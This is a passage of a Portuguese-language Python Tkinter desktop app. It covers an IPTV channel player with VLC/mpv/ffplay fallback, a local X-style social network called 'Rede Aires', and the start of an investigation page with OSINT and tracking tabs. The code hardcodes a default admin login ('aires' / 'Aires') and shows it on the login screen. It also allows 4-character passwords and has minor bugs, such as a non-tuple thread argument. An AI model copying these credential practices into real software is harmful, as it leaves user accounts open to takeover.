    def save_canais(self):
        save_json(IPTV_FILE, self.canais)

    def refresh_lista(self):
        self.listbox.delete(0, "end")
        filtro = self.search_var.get().lower()
        cat = self.cat_var.get()
        self.filtered = []
        for c in self.canais:
            if cat!="Tudo" and c.get("categoria")!=cat:
                continue
            if filtro and filtro not in c.get("nome","").lower() and filtro not in c.get("pais","").lower():
                continue
            self.filtered.append(c)
        for c in self.filtered:
            fav = "★ " if c.get("fav") else "  "
            self.listbox.insert("end", fav + c.get("nome") + " [" + c.get("categoria") + "]")
        try:
            self.count_label.configure(text=str(len(self.filtered)) + "/" + str(len(self.canais)))
        except:
            pass

    def on_select(self, evt):
        sel = self.listbox.curselection()
        if not sel:
            return
        idx = sel[0]
        canal = self.filtered[idx]
        real_idx = next((i for i, x in enumerate(self.canais) if x["id"]==canal["id"]), None)
        self.selected_idx = real_idx
        for k in ["nome","url","logo","pais"]:
            w = self.fields[k]
            w.delete(0, "end")
            w.insert(0, canal.get(k,""))
        self.fields["categoria"].set(canal.get("categoria","Entretenimento"))
        try:
            self.video_label.configure(text="▶ " + canal.get("nome") + "\\n" + canal.get("pais") + " | " + canal.get("categoria") + "\\n\\n" + canal.get("url")[:90] + "...\\n\\nClique PLAY para reproduzir sem erros")
        except:
            pass

    def novo_canal(self):
        self.selected_idx=None
        for k in ["nome","url","logo","pais"]:
            self.fields[k].delete(0,"end")
        self.fields["categoria"].set("Entretenimento")
        self.listbox.selection_clear(0,"end")
        self.status_label.configure(text="● Novo canal - preenche e guarda")

    def guardar_canal(self):
        nome = self.fields["nome"].get().strip()
        url = self.fields["url"].get().strip()
        if not nome or not url:
            messagebox.showwarning("Aviso","Nome e URL são obrigatórios")
            return
        dados = {
            "id": self.canais[self.selected_idx]["id"] if self.selected_idx is not None else str(uuid.uuid4()),
            "nome": nome,
            "url": url,
            "logo": self.fields["logo"].get().strip(),
            "pais": self.fields["pais"].get().strip() or "Desconhecido",
            "categoria": self.fields["categoria"].get(),
            "fav": self.canais[self.selected_idx].get("fav", False) if self.selected_idx is not None else False
        }
        if self.selected_idx is not None:
            self.canais[self.selected_idx]=dados
        else:
            self.canais.append(dados)
        self.save_canais()
        self.refresh_lista()
        messagebox.showinfo("OK","Canal guardado!")

    def remover_canal(self):
        if self.selected_idx is None:
            return
        if messagebox.askyesno("Confirmar","Remover este canal?"):
            del self.canais[self.selected_idx]
            self.save_canais()
            self.selected_idx=None
            self.refresh_lista()
            self.novo_canal()

    def toggle_fav(self):
        if self.selected_idx is None:
            return
        self.canais[self.selected_idx]["fav"] = not self.canais[self.selected_idx].get("fav", False)
        self.save_canais()
        self.refresh_lista()

    def copiar_url(self):
        url=""
        if self.selected_idx is not None:
            url=self.canais[self.selected_idx].get("url")
        else:
            url=self.fields["url"].get()
        self.clipboard_clear()
        self.clipboard_append(url)
        self.status_label.configure(text="● URL copiada: " + url[:60])

    def reparar_url(self):
        url = self.fields["url"].get().strip()
        if not url:
            return
        fixed = url.strip().replace(" ", "%20")
        # Try http -> https if needed? We keep both options
        # Remove duplicate slashes etc
        self.fields["url"].delete(0, "end")
        self.fields["url"].insert(0, fixed)
        self.status_label.configure(text="● URL reparada: " + fixed[:80])

    def testar_url(self):
        url = self.fields["url"].get().strip()
        if not url:
            return
        self.status_label.configure(text="● A testar URL: " + url[:60] + "...")
        threading.Thread(target=self.testar_url_worker, args=(url), daemon=True).start()

    def testar_url_worker(self, url):
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                code = r.getcode()
                content_type = r.headers.get("Content-Type","")
                length = r.headers.get("Content-Length","?")
                def update_ok():
                    self.status_label.configure(text="● URL OK [" + str(code) + "] " + content_type + " - " + str(length) + " bytes - Pronto para PLAY")
                    self.buffer_label.configure(text="OK")
                self.after(0, update_ok)
        except Exception as e:
            def update_err():
                self.status_label.configure(text="● URL ERRO: " + str(e)[:80])
                self.buffer_label.configure(text="ERRO")
            self.after(0, update_err)

    def abrir_stream(self):
        url=""
        nome="Canal"
        if self.selected_idx is not None:
            url=self.canais[self.selected_idx].get("url")
            nome=self.canais[self.selected_idx].get("nome")
        else:
            url=self.fields["url"].get()
        if not url:
            messagebox.showwarning("Aviso","Sem URL")
            return
        self.status_label.configure(text="● A reproduzir: " + nome + " - " + url[:60])
        self.play_with_fallback(url, nome)

    def play_with_fallback(self, url, nome=""):
        # Stop previous
        self.stop_stream()
        engine = self.engine_var.get() if hasattr(self, 'engine_var') else self.player_engine

        # Try in order: vlc, mpv, ffplay, browser
        def try_vlc():
            try:
                import vlc
                # Hide placeholder label and show vlc frame
                self.video_label.pack_forget()
                self.vlc_frame.pack(fill="both", expand=True)
                self.vlc_frame.tkraise()
                # Create VLC instance
                instance = vlc.Instance("--no-xlib")
                self.current_vlc_player = instance.media_player_new()
                media = instance.media_new(url)
                # Set user agent
                media.add_option(":http-user-agent=" + self.user_agent)
                media.add_option(":network-caching=1000")
                self.current_vlc_player.set_media(media)
                # Set window handle - Linux
                try:
                    if platform.system() == "Linux":
                        self.current_vlc_player.set_xwindow(self.vlc_frame.winfo_id())
                    elif platform.system() == "Windows":
                        self.current_vlc_player.set_hwnd(self.vlc_frame.winfo_id())
                except:
                    pass
                self.current_vlc_player.play()
                self.status_label.configure(text="● PLAYING VLC: " + nome)
                return True
            except Exception as e:
                print("VLC failed", e)
                return False

        def try_mpv():
            try:
                if shutil.which("mpv"):
                    self.current_player_process = subprocess.Popen(["mpv", "--no-terminal", "--force-window=no", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.status_label.configure(text="● PLAYING MPV: " + nome)
                    return True
            except Exception as e:
                print("MPV failed", e)
            return False

        def try_ffplay():
            try:
                if shutil.which("ffplay"):
                    self.current_player_process = subprocess.Popen(["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.status_label.configure(text="● PLAYING FFPLAY: " + nome)
                    return True
            except Exception as e:
                print("FFPLAY failed", e)
            return False

        def try_browser():
            try:
                webbrowser.open(url)
                self.status_label.configure(text="● ABERTO NO BROWSER: " + nome)
                return True
            except Exception as e:
                print("Browser failed", e)
            return False

        # Auto logic with retry and fallback
        success = False
        if engine == "vlc":
            success = try_vlc() or try_mpv() or try_ffplay() or try_browser()
        elif engine == "mpv":
            success = try_mpv() or try_vlc() or try_ffplay() or try_browser()
        elif engine == "ffplay":
            success = try_ffplay() or try_vlc() or try_mpv() or try_browser()
        elif engine == "browser":
            success = try_browser()
        else: # auto
            success = try_vlc() or try_mpv() or try_ffplay() or try_browser()

        if not success:
            # Fallback repair: try https, try with referer, etc
            self.status_label.configure(text="● ERRO - Tentando reparo automático...")
            # Try https version
            if url.startswith("http://"):
                https_url = url.replace("http://", "https://")
                self.fields["url"].delete(0, "end")
                self.fields["url"].insert(0, https_url)
                self.after(1000, lambda: self.play_with_fallback(https_url, nome + " (https)"))
            else:
                messagebox.showerror("Erro Player", "Não foi possível reproduzir.\\nVerifique se VLC/MPV está instalado.\\nURL: " + url)
                self.video_label.pack(fill="both", expand=True)
                self.vlc_frame.pack_forget()

    def stop_stream(self):
        try:
            if self.current_vlc_player:
                self.current_vlc_player.stop()
                self.current_vlc_player = None
            if self.current_player_process:
                self.current_player_process.terminate()
                self.current_player_process = None
        except:
            pass
        # Show placeholder again
        try:
            self.vlc_frame.pack_forget()
            self.video_label.pack(fill="both", expand=True)
            self.status_label.configure(text="● Parado - Pronto")
        except:
            pass







class RedeAiresPage(Page):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("REDE AIRES // SOCIAL", "rede social tipo X - registo, login, feed, likes e reposts")
        self.current_user = None  # dict do utilizador logado da rede
        self.users = {}  # username -> dados
        self.posts = []  # lista posts
        self.follows = {}  # username -> lista seguindo
        self.view_mode = "para_si"  # para_si, seguindo, perfil
        self.load_data()
        
        # Container principal que vai trocar entre login e feed
        self.main_container = tk.Frame(self, bg=BG)
        self.main_container.pack(fill="both", expand=True, padx=0, pady=0)
        
        self.show_login_screen()
    
    def load_data(self):
        # users
        data = load_json(REDE_AIRES_USERS_FILE, {})
        if isinstance(data, dict):
            self.users = data
        else:
            self.users = {}
        # posts
        self.posts = load_json(REDE_AIRES_POSTS_FILE, [])
        # follows
        fd = load_json(REDE_AIRES_FOLLOWS_FILE, {})
        self.follows = fd if isinstance(fd, dict) else {}
        # criar user admin se vazio
        if not self.users:
            self.users = {
                "aires": {
                    "username": "aires",
                    "display_name": "Sir Aires",
                    "email": "aires@rede.local",
                    "password": hash_password("Aires"),
                    "bio": "Fundador da Rede Aires 🚀",
                    "avatar": "",
                    "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "verified": True
                }
            }
            save_json(REDE_AIRES_USERS_FILE, self.users)
            self.posts = [
                {
                    "id": str(uuid.uuid4()),
                    "author": "aires",
                    "display_name": "Sir Aires",
                    "content": "Bem-vindos à Rede Aires! 🚀 A nova rede social estilo X. Criem conta e comecem a postar! #RedeAires #Lançamento",
                    "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "likes": [],
                    "reposts": [],
                    "comments": []
                }
            ]
            save_json(REDE_AIRES_POSTS_FILE, self.posts)
    
    def save_users(self):
        save_json(REDE_AIRES_USERS_FILE, self.users)
    def save_posts(self):
        save_json(REDE_AIRES_POSTS_FILE, self.posts)
    def save_follows(self):
        save_json(REDE_AIRES_FOLLOWS_FILE, self.follows)
    
    def clear_main(self):
        for w in self.main_container.winfo_children():
            w.destroy()
    
    def show_login_screen(self):
        self.clear_main()
        frame = tk.Frame(self.main_container, bg=BG)
        frame.pack(fill="both", expand=True)
        
        # Centro
        center = tk.Frame(frame, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=420, height=520)
        center.place(relx=0.5, rely=0.5, anchor="center")
        
        tk.Label(center, text="✖ REDE AIRES", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 22, "bold")).pack(pady=(24,4))
        tk.Label(center, text="Entra ou cria conta para continuar", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(pady=(0,16))
        
        # Tabs
        tab_frame = tk.Frame(center, bg=PANEL_BG)
        tab_frame.pack(fill="x", padx=20, pady=4)
        
        self.login_tab_btn = tk.Button(tab_frame, text="LOGIN", command=self.show_tab_login, width=12)
        self.login_tab_btn.pack(side="left", padx=2, ipady=6)
        style_button(self.login_tab_btn)
        
        self.reg_tab_btn = tk.Button(tab_frame, text="REGISTO", command=self.show_tab_registo, width=12)
        self.reg_tab_btn.pack(side="left", padx=2, ipady=6)
        style_button(self.reg_tab_btn)
        
        self.form_frame = tk.Frame(center, bg=PANEL_BG)
        self.form_frame.pack(fill="both", expand=True, padx=20, pady=12)
        
        self.show_tab_login()
    
    def show_tab_login(self):
        for w in self.form_frame.winfo_children():
            w.destroy()
        tk.Label(self.form_frame, text="USERNAME", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,8,"bold")).pack(anchor="w", pady=(8,2))
        self.login_user_entry = tk.Entry(self.form_frame, bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,11))
        self.login_user_entry.pack(fill="x", ipady=8, pady=2)
        
        tk.Label(self.form_frame, text="PASSWORD", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,8,"bold")).pack(anchor="w", pady=(12,2))
        self.login_pass_entry = tk.Entry(self.form_frame, show="•", bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,11))
        self.login_pass_entry.pack(fill="x", ipady=8, pady=2)
        
        btn = tk.Button(self.form_frame, text="➜ ENTRAR NA REDE", command=self.do_login)
        btn.pack(fill="x", pady=(20,8), ipady=10)
        style_button(btn)
        
        tk.Label(self.form_frame, text="Dica: user inicial aires / Aires", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,7)).pack(pady=4)
    
    def show_tab_registo(self):
        for w in self.form_frame.winfo_children():
            w.destroy()
        self.reg_fields={}
        for key,label,placeholder in [("username","USERNAME (sem espaços)","ex: joao123"),("display_name","NOME DE EXIBIÇÃO","ex: João Aires"),("email","EMAIL","ex: joao@email.com"),("password","PASSWORD","min 4 chars"),("password2","CONFIRMAR PASSWORD","repete password"),("bio","BIO (opcional)","Fala sobre ti...")]:
            tk.Label(self.form_frame, text=label, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,7,"bold")).pack(anchor="w", pady=(6,1))
            if key=="bio":
                txt=tk.Entry(self.form_frame, bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,9))
                txt.pack(fill="x", ipady=6)
                self.reg_fields[key]=txt
            else:
                show = "•" if "password" in key else None
                e=tk.Entry(self.form_frame, show=show, bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,9))
                e.pack(fill="x", ipady=6)
                self.reg_fields[key]=e
        
        btn=tk.Button(self.form_frame, text="✚ CRIAR CONTA", command=self.do_registo)
        btn.pack(fill="x", pady=(16,4), ipady=10)
        style_button(btn)
    
    def do_login(self):
        username=self.login_user_entry.get().strip().lower()
        pwd=self.login_pass_entry.get()
        if not username or not pwd:
            messagebox.showwarning("Aviso","Preenche tudo")
            return
        user=self.users.get(username)
        if not user:
            messagebox.showerror("Erro","Utilizador não existe")
            return
        if not verify_password(user.get("password",""), pwd):
            messagebox.showerror("Erro","Password incorreta")
            return
        self.current_user=user
        self.show_feed()
    
    def do_registo(self):
        data={}
        for k,w in self.reg_fields.items():
            data[k]=w.get().strip() if hasattr(w,"get") else ""
        # validações
        if not data["username"] or not data["display_name"] or not data["email"] or not data["password"]:
            messagebox.showwarning("Aviso","Preenche campos obrigatórios")
            return
        if " " in data["username"]:
            messagebox.showwarning("Aviso","Username sem espaços")
            return
        if data["username"].lower() in self.users:
            messagebox.showerror("Erro","Username já existe")
            return
        if data["password"]!=data["password2"]:
            messagebox.showerror("Erro","Passwords não coincidem")
            return
        if len(data["password"])<4:
            messagebox.showwarning("Aviso","Password min 4 chars")
            return
        username=data["username"].lower()
        new_user={
            "username": username,
            "display_name": data["display_name"],
            "email": data["email"],
            "password": hash_password(data["password"]),
            "bio": data["bio"],
            "avatar": "",
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "verified": False
        }
        self.users[username]=new_user
        self.follows[username]=[]
        self.save_users()
        self.save_follows()
        messagebox.showinfo("OK","Conta criada! Faz login agora")
        self.show_tab_login()
    
    def show_feed(self):
        self.clear_main()
        
        # Layout 3 colunas tipo X
        left = tk.Frame(self.main_container, bg=SIDEBAR_BG, width=200, highlightthickness=1, highlightbackground=ACCENT_DIM)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)
        
        tk.Label(left, text=f"@{self.current_user['username']}", bg=SIDEBAR_BG, fg=ACCENT, font=(FONT_MONO,12,"bold")).pack(pady=(16,2), padx=12, anchor="w")
        tk.Label(left, text=self.current_user['display_name'], bg=SIDEBAR_BG, fg=TEXT, font=(FONT_MONO,9,"bold")).pack(padx=12, anchor="w")
        tk.Label(left, text=self.current_user.get('bio','')[:60], bg=SIDEBAR_BG, fg=TEXT_DIM, font=(FONT_MONO,7), wraplength=180, justify="left").pack(padx=12, pady=(4,12), anchor="w")
        
        for txt,mode in [("🏠 Para Si","para_si"),("👥 A Seguir","seguindo"),("👤 Perfil","perfil"),("🔥 Tendências","tendencias")]:
            b=tk.Button(left, text=txt, command=lambda m=mode: self.switch_mode(m))
            b.pack(fill="x", padx=10, pady=3, ipady=8)
            style_sidebar_button(b)
        
        b_logout=tk.Button(left, text="🚪 SAIR", command=self.logout)
        b_logout.pack(side="bottom", fill="x", padx=10, pady=12, ipady=8)
        b_logout.configure(bg="#1a0a0f", fg=ERROR, activebackground="#2a0f17", relief="flat", bd=0, font=(FONT_MONO,8,"bold"), cursor="hand2")
        
        # Center feed
        center = tk.Frame(self.main_container, bg=BG)
        center.pack(side="left", fill="both", expand=True, padx=0)
        
        # criar post box
        create_frame = tk.Frame(center, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        create_frame.pack(fill="x", padx=12, pady=12)
        
        tk.Label(create_frame, text=f"O que se passa, {self.current_user['display_name']}?", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,9)).pack(anchor="w", padx=12, pady=(10,4))
        self.post_text = scrolledtext.ScrolledText(create_frame, height=3, bg=BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,10), wrap="word")
        self.post_text.pack(fill="x", padx=12, pady=4)
        self.post_text.bind("<KeyRelease>", self.update_char_count)
        
        bottom_create = tk.Frame(create_frame, bg=PANEL_BG)
        bottom_create.pack(fill="x", padx=12, pady=(4,10))
        self.char_label = tk.Label(bottom_create, text="280", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,8))
        self.char_label.pack(side="left")
        b_post = tk.Button(bottom_create, text="✖ Postar", command=self.criar_post)
        b_post.pack(side="right", padx=4, ipady=6)
        style_button(b_post)
        
        # feed scrollable
        feed_container = tk.Frame(center, bg=BG)
        feed_container.pack(fill="both", expand=True, padx=12, pady=(0,12))
        
        canvas = tk.Canvas(feed_container, bg=BG, highlightthickness=0)
        scrollbar = tk.Scrollbar(feed_container, orient="vertical", command=canvas.yview)
        self.feed_frame = tk.Frame(canvas, bg=BG)
        
        self.feed_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=self.feed_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Right - tendências e quem seguir
        right = tk.Frame(self.main_container, bg=PANEL_BG, width=240, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="right", fill="y")
        right.pack_propagate(False)
        
        tk.Label(right, text="🔥 Tendências", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,11,"bold")).pack(anchor="w", padx=12, pady=(12,8))
        self.trends_frame = tk.Frame(right, bg=PANEL_BG)
        self.trends_frame.pack(fill="x", padx=8, pady=4)
        
        tk.Label(right, text="👥 Quem seguir", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,11,"bold")).pack(anchor="w", padx=12, pady=(16,8))
        self.follow_frame = tk.Frame(right, bg=PANEL_BG)
        self.follow_frame.pack(fill="x", padx=8, pady=4)
        
        tk.Label(right, text=f"{len(self.posts)} posts • {len(self.users)} users", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,7)).pack(side="bottom", pady=12)
        
        self.refresh_feed()
    
    def update_char_count(self, evt=None):
        txt = self.post_text.get("1.0","end-1c")
        remaining = 280 - len(txt)
        self.char_label.configure(text=str(remaining), fg=ERROR if remaining<0 else TEXT_DIM)
    
    def criar_post(self):
        content = self.post_text.get("1.0","end-1c").strip()
        if not content:
            return
        if len(content)>280:
            messagebox.showwarning("Aviso","Máx 280 caracteres")
            return
        post={
            "id": str(uuid.uuid4()),
            "author": self.current_user["username"],
            "display_name": self.current_user["display_name"],
            "content": content,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "likes": [],
            "reposts": [],
            "comments": []
        }
        self.posts.insert(0, post)
        self.save_posts()
        self.post_text.delete("1.0","end")
        self.update_char_count()
        self.refresh_feed()
    
    def switch_mode(self, mode):
        self.view_mode=mode
        self.refresh_feed()
    
    def logout(self):
        self.current_user=None
        self.show_login_screen()
    
    def refresh_feed(self):
        # limpar feed
        for w in self.feed_frame.winfo_children():
            w.destroy()
        for w in self.trends_frame.winfo_children():
            w.destroy()
        for w in self.follow_frame.winfo_children():
            w.destroy()
        
        # filtrar posts
        if self.view_mode=="para_si":
            posts_to_show=self.posts
            title="Para Si"
        elif self.view_mode=="seguindo":
            following=self.follows.get(self.current_user["username"], [])
            posts_to_show=[p for p in self.posts if p["author"] in following or p["author"]==self.current_user["username"]]
            title=f"A Seguir ({len(following)})"
        elif self.view_mode=="perfil":
            posts_to_show=[p for p in self.posts if p["author"]==self.current_user["username"]]
            title="Meu Perfil"
        else:
            posts_to_show=self.posts
            title="Tendências"
        
        # header feed
        tk.Label(self.feed_frame, text=f"{title} — {len(posts_to_show)} posts", bg=BG, fg=TEXT_DIM, font=(FONT_MONO,9,"bold")).pack(anchor="w", pady=6)
        
        if not posts_to_show:
            tk.Label(self.feed_frame, text="Nenhum post ainda. Sê o primeiro! ✖", bg=BG, fg=TEXT_DIM, font=(FONT_MONO,10)).pack(pady=40)
        
        for post in posts_to_show:
            self.render_post(post)
        
        # tendências - hashtags
        hashtags={}
        for p in self.posts:
            for word in p["content"].split():
                if word.startswith("#") and len(word)>1:
                    hashtags[word.lower()]=hashtags.get(word.lower(),0)+1
        sorted_tags=sorted(hashtags.items(), key=lambda x: x[1], reverse=True)[:8]
        if sorted_tags:
            for tag,count in sorted_tags:
                tk.Label(self.trends_frame, text=f"{tag} • {count} posts", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO,8), anchor="w").pack(fill="x", pady=2)
        else:
            tk.Label(self.trends_frame, text="#RedeAires", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,8)).pack(anchor="w")
        
        # quem seguir
        following=self.follows.get(self.current_user["username"], [])
        candidates=[u for u in self.users.values() if u["username"]!=self.current_user["username"] and u["username"] not in following][:5]
        if not candidates and len(self.users)>1:
            candidates=list(self.users.values())[:3]
        
        for u in candidates:
            row=tk.Frame(self.follow_frame, bg=PANEL_BG)
            row.pack(fill="x", pady=4)
            tk.Label(row, text=u["display_name"], bg=PANEL_BG, fg=TEXT, font=(FONT_MONO,8,"bold"), anchor="w").pack(fill="x")
            tk.Label(row, text=f"@{u['username']}", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,7), anchor="w").pack(fill="x")
            if u["username"] not in following:
                b=tk.Button(row, text="Seguir", command=lambda un=u["username"]: self.follow_user(un))
                b.pack(anchor="w", pady=2, ipady=2)
                style_button(b)
            else:
                b=tk.Button(row, text="Deixar de seguir", command=lambda un=u["username"]: self.unfollow_user(un))
                b.pack(anchor="w", pady=2, ipady=2)
                style_button(b)
    
    def render_post(self, post):
        card=tk.Frame(self.feed_frame, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        card.pack(fill="x", pady=6, padx=2)
        
        header=tk.Frame(card, bg=PANEL_BG)
        header.pack(fill="x", padx=12, pady=(10,4))
        
        verified=" ✓" if self.users.get(post["author"],{}).get("verified") else ""
        tk.Label(header, text=f"{post['display_name']}{verified}", bg=PANEL_BG, fg=TEXT, font=(FONT_MONO,10,"bold")).pack(side="left")
        tk.Label(header, text=f"@{post['author']} • {post['timestamp']}", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO,7)).pack(side="left", padx=(8,0))
        
        if post["author"]==self.current_user["username"]:
            b_del=tk.Button(header, text="✕", command=lambda pid=post["id"]: self.delete_post(pid), width=2)
            b_del.pack(side="right")
            b_del.configure(bg=PANEL_BG, fg=ERROR, relief="flat", bd=0, font=(FONT_MONO,8), cursor="hand2")
        
        content_frame=tk.Frame(card, bg=PANEL_BG)
        content_frame.pack(fill="x", padx=12, pady=4)
        tk.Label(content_frame, text=post["content"], bg=PANEL_BG, fg=TEXT, font=(FONT_MONO,10), wraplength=460, justify="left", anchor="w").pack(anchor="w")
        
        actions=tk.Frame(card, bg=PANEL_BG)
        actions.pack(fill="x", padx=12, pady=(6,10))
        
        liked = self.current_user["username"] in post.get("likes",[])
        like_txt = f"❤ {len(post.get('likes',[]))}" if post.get("likes") else "♡ Curtir"
        if liked:
            like_txt = f"❤ {len(post.get('likes',[]))} • Curtiu"
        b_like=tk.Button(actions, text=like_txt, command=lambda pid=post["id"]: self.toggle_like(pid))
        b_like.pack(side="left", padx=(0,8), ipady=3)
        style_button(b_like)
        if liked:
            b_like.configure(fg="#ff3b5c")
        
        reposted = self.current_user["username"] in post.get("reposts",[])
        rt_txt = f"🔁 {len(post.get('reposts',[]))}" if post.get("reposts") else "🔁 Repost"
        b_rt=tk.Button(actions, text=rt_txt, command=lambda pid=post["id"]: self.toggle_repost(pid))
        b_rt.pack(side="left", padx=4, ipady=3)
        style_button(b_rt)
        
        c_count=len(post.get("comments",[]))
        b_com=tk.Button(actions, text=f"💬 {c_count}" if c_count else "💬 Comentar", command=lambda p=post: self.comment_post(p))
        b_com.pack(side="left", padx=4, ipady=3)
        style_button(b_com)
        
        # comentarios
        if post.get("comments"):
            comm_frame=tk.Frame(card, bg=BG)
            comm_frame.pack(fill="x", padx=12, pady=(4,8))
            for c in post.get("comments",[])[-3:]:  # últimos 3
                tk.Label(comm_frame, text=f"@{c['author']}: {c['content']}", bg=BG, fg=TEXT_DIM, font=(FONT_MONO,8), wraplength=440, justify="left", anchor="w").pack(anchor="w", pady=1)
    
    def toggle_like(self, post_id):
        post=next((p for p in self.posts if p["id"]==post_id), None)
        if not post:
            return
        user=self.current_user["username"]
        if user in post["likes"]:
            post["likes"].remove(user)
        else:
            post["likes"].append(user)
        self.save_posts()
        self.refresh_feed()
    
    def toggle_repost(self, post_id):
        post=next((p for p in self.posts if p["id"]==post_id), None)
        if not post:
            return
        user=self.current_user["username"]
        if user in post["reposts"]:
            post["reposts"].remove(user)
        else:
            post["reposts"].append(user)
        self.save_posts()
        self.refresh_feed()
    
    def delete_post(self, post_id):
        if not messagebox.askyesno("Confirmar","Apagar este post?"):
            return
        self.posts=[p for p in self.posts if p["id"]!=post_id]
        self.save_posts()
        self.refresh_feed()
    
    def comment_post(self, post):
        # popup simples
        win=tk.Toplevel(self)
        win.title(f"Comentar - @{post['author']}")
        win.geometry("400x250")
        win.configure(bg=BG)
        tk.Label(win, text=f"Responder a @{post['author']}:", bg=BG, fg=ACCENT, font=(FONT_MONO,10,"bold")).pack(anchor="w", padx=12, pady=10)
        tk.Label(win, text=post["content"][:100]+"...", bg=BG, fg=TEXT_DIM, font=(FONT_MONO,8), wraplength=380, justify="left").pack(anchor="w", padx=12)
        txt=scrolledtext.ScrolledText(win, height=4, bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO,9))
        txt.pack(fill="x", padx=12, pady=12)
        
        def send():
            content=txt.get("1.0","end-1c").strip()
            if not content:
                return
            post["comments"].append({"author": self.current_user["username"], "content": content, "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
            self.save_posts()
            win.destroy()
            self.refresh_feed()
        
        b=tk.Button(win, text="Responder", command=send)
        b.pack(pady=8, padx=12, fill="x", ipady=8)
        style_button(b)
    
    def follow_user(self, username):
        if self.current_user["username"] not in self.follows:
            self.follows[self.current_user["username"]]=[]
        if username not in self.follows[self.current_user["username"]]:
            self.follows[self.current_user["username"]].append(username)
            self.save_follows()
            self.refresh_feed()
    
    def unfollow_user(self, username):
        if self.current_user["username"] in self.follows and username in self.follows[self.current_user["username"]]:
            self.follows[self.current_user["username"]].remove(username)
            self.save_follows()
            self.refresh_feed()



# ─────────────────────────────────────────────
# Investigação Page - personalizável
# ─────────────────────────────────────────────
class InvestigacaoPage(Page):
    TAB_DEFS = {
        "dash": ("  INFORMAÇÕES  ", "DashboardWidget"),
        "buscas": ("  REGISTOS  ", "BuscaWidget"),
        "casos": ("  CASOS  ", "CasosWidget"),
        "clientes": ("  CLIENTES  ", "ClientesWidget"),
        "osint": ("  OSINT  ", "OSINTInvestigacaoWidget"),
        "veiculos": ("  VEÍCULOS  ", "VeiculosInvestigacaoWidget"),
        "camaras": ("  CÂMARAS  ", "CamarasInvestigacaoWidget"),
        "avioes": ("  ✈ AVIÕES  ", "AvioesInvestigacaoWidget"),
        "barcos": ("  🚢 BARCOS  ", "BarcosInvestigacaoWidget"),
        "drones": ("  🛸 DRONES  ", "DronesInvestigacaoWidget"),
    }
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.app_ref = app
        self.header("INVESTIGAÇÃO", "categoria central — personalizável via USUÁRIO > PERSONALIZAÇÃO (▲▼)")
        self.notebook = None
        self.widgets = {}
        self.tab_frames = {}
        self.build_tabs()
    def build_tabs(self):
        if self.notebook:
            try:
                self.notebook.destroy()
            except Exception:
                pass
        self.widgets = {}
        self.tab_frames = {}
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[12, 7], font=(FONT_MONO, 7, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        cfg = load_ui_config()
        order = cfg.get("investigacao_order", get_default_ui_config()["investigacao_order"])
        hidden = cfg.get("investigacao_hidden", [])
        class_map = {
            "DashboardWidget": globals().get("DashboardWidget"),
            "BuscaWidget": globals().get("BuscaWidget"),
            "CasosWidget": globals().get("CasosWidget"),
            "ClientesWidget": globals().get("ClientesWidget"),
            "OSINTInvestigacaoWidget": globals().get("OSINTInvestigacaoWidget"),
            "VeiculosInvestigacaoWidget": globals().get("VeiculosInvestigacaoWidget"),
            "CamarasInvestigacaoWidget": globals().get("CamarasInvestigacaoWidget"),
